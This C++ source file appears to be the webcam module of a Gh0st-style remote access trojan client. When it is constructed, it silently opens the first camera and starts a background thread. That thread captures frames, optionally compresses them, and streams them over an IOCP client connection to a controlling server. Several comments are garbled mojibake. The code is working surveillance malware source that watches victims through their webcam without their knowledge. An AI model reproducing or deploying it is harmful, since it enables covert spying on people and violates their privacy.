#include "stdafx.h"
#include "VideoManager.h"
#include "Common.h"

CVideoManager::CVideoManager(IOCPClient* ClientObject)
	:CManager(ClientObject)
{
	m_bisWorking = TRUE;

	m_bIsCompress = FALSE;
	m_pVideoCodec = NULL;

	m_fccHandler = 1129730893;
	m_CapVideo.Open(0,0);
	m_WorkThreadHandle = CreateThread(NULL, 0,
		(LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL);
}


CVideoManager::~CVideoManager()
{

}

VOID CVideoManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
	switch (szBuffer[0])
	{
		case COMMAND_NEXT:
		{
			NotifyDialogOpen();
			break;
		}

		default:
			break;
	}
}

DWORD WINAPI CVideoManager::WorkThread(LPVOID lParam)
{
	CVideoManager* This = (CVideoManager*)lParam;
	static DWORD dwLastScreen = GetTickCount();

	if (This->Initialize())
	{
		This->m_bIsCompress = TRUE;
	}
	This->SendBitMapInfor();
	This->WaitForDialogOpen();

	while (This->m_bisWorking)
	{
		if ((GetTickCount() - dwLastScreen) < 159)
		{
			Sleep(100);
		}
		dwLastScreen = GetTickCount();
		This->SendNextScreen();

	}
	This->Destroy();
	return 0;

}

BOOL CVideoManager::Initialize()
{
	BOOL bReturn = TRUE;
	if (m_pVideoCodec != NULL)
	{
		delete m_pVideoCodec;
		m_pVideoCodec = NULL;

	}
	if (m_fccHandler == 0)
	{
		bReturn = FALSE;
		return bReturn;
	}

	m_pVideoCodec = new CVideoCodec;

	if (!m_pVideoCodec->InitCompressor(m_CapVideo.GetBmpInfor(), m_fccHandler))
	{
		delete m_pVideoCodec;
		bReturn = FALSE;
		// ��NULL, ����ʱ�ж��Ƿ�ΪNULL���ж��Ƿ�ѹ��
		m_pVideoCodec = NULL;
	}

	return bReturn;

}

VOID CVideoManager::SendBitMapInfor()
{
	DWORD szBufferLength = 1 + sizeof(BITMAPINFO);
	LPBYTE szBuffer = new BYTE[szBufferLength];
	if (szBuffer == NULL)
	{
		return;
	}
	szBuffer[0] = TOKEN_WEBCAM_BITMAPINFO;
	memcpy(szBuffer + 1, m_CapVideo.GetBmpInfor(), sizeof(BITMAPINFO));
	m_ClientObject->OnServerSending((char*)szBuffer, szBufferLength);
	delete[] szBuffer;
}

VOID  CVideoManager::SendNextScreen()
{
	DWORD dwBmpImageSize = 0;
	LPVOID	lpDIB = m_CapVideo.GetDIB(dwBmpImageSize); //m_pVideoCap->GetDIB();
													   // token + IsCompress + m_fccHandler + DIB
	int		nHeadLen = 1 + 1 + 4;

	UINT	nBufferLen = nHeadLen + dwBmpImageSize;//m_pVideoCap->m_lpbmi->bmiHeader.biSizeImage;
	LPBYTE	lpBuffer = new BYTE[nBufferLen];
	if (lpBuffer == NULL)
		return;

	lpBuffer[0] = TOKEN_WEBCAM_DIB;
	lpBuffer[1] = m_bIsCompress;   //ѹ��  

	memcpy(lpBuffer + 2, &m_fccHandler, sizeof(DWORD));     //���ｫ��Ƶѹ����д��Ҫ���͵Ļ�����

	UINT	nPacketLen = 0;
	if (m_bIsCompress && m_pVideoCodec)            //�����жϣ��Ƿ�ѹ����ѹ�����Ƿ��ʼ���ɹ�������ɹ���ѹ��          
	{
		int	nCompressLen = 0;
		//����ѹ����Ƶ������ 
		bool bRet = m_pVideoCodec->EncodeVideoData((LPBYTE)lpDIB,
			m_CapVideo.GetBmpInfor()->bmiHeader.biSizeImage, lpBuffer + nHeadLen,
			&nCompressLen, NULL);
		if (!nCompressLen)
		{
			// some thing ...
			return;
		}
		//���¼��㷢�����ݰ��Ĵ�С  ʣ�¾��Ƿ����� �����ǵ����ض˿�һ����Ƶ���ѹ������ô����
		//�����ض˵�void CVideoDlg::OnReceiveComplete(void)
		nPacketLen = nCompressLen + nHeadLen;
	}
	else
	{
		//��ѹ��  ��Զ����
		memcpy(lpBuffer + nHeadLen, lpDIB, dwBmpImageSize);
		nPacketLen = dwBmpImageSize + nHeadLen;
		//m_pVideoCap->m_lpbmi->bmiHeader.biSizeImage + nHeadLen;
	}
	m_CapVideo.SendEnd();    //copy  send
							 //	Send(lpBuffer, nPacketLen);

	m_ClientObject->OnServerSending((char*)lpBuffer, nPacketLen);

	delete[] lpBuffer;
}


void CVideoManager::Destroy()
{



	if (m_pVideoCodec)   //ѹ����
	{
		delete m_pVideoCodec;
		m_pVideoCodec = NULL;
	}



}